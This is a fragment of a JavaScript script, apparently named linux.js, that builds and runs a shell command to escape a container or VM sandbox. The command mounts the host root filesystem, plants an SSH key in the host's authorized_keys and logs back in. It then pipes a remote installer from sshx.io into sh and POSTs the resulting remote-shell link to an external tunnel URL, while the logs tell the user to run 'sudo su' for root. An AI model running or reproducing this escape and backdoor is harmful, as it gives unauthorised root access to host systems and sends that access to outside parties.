...
logToFile(`New linux.js started with token: ${token}, route: ${route}, tunnel: ${tunnelUrl}`);
...
async function main() {
  ...
  const command =
  'cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa; echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip ' +
  `'curl -fsSL https://sshx.io/get | sh; nohup sshx > sshx.log 2>&1 & SSHX_PID=$!; echo "sshx PID: $SSHX_PID"; echo -n "Đang chờ link SSHx..."; while true; do LINK=$(grep -o "https://sshx\\.io/s/[A-Za-z0-9#]*" sshx.log | head -n 1); [ -n "$LINK" ] && { echo -e "\\nLink SSHx: $LINK"; curl -X POST -H "Content-Type: application/json" -d "{\\"sshx\\":\\"$LINK\\",\\"route\\":\\"${route}\\"}" ${tunnelUrl}/sshx 2>/dev/null || echo "Failed to send SSHx link"; break; }; sleep 2; done'`;
  ...
  if (sshxLink) {
    logToFile("SSHx Link:", sshxLink);
    logToFile("Type sudo su to get root");
  } else {
    logToFile("SSHx Link: Not captured (check manually)");
  }
  logToFile("VM is running. Use the SSHx link above to connect.");
